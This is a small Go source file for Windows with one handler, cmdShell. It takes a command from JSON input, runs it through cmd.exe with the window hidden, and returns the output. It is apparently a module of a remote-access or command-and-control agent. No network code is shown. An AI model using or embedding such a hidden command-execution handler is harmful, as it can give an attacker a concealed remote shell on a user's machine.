//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"os/exec"
	"strings"
	"syscall"
)

type ShellParams struct {
	Command string `json:"command"`
}

func cmdShell(raw json.RawMessage) string {
	var p ShellParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	cmd := exec.Command("cmd.exe", "/c", p.Command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output) + "\n" + err.Error()
	}

	out := string(output)
	if strings.TrimSpace(out) == "" {
		return "command completed (no output)"
	}
	return out
}
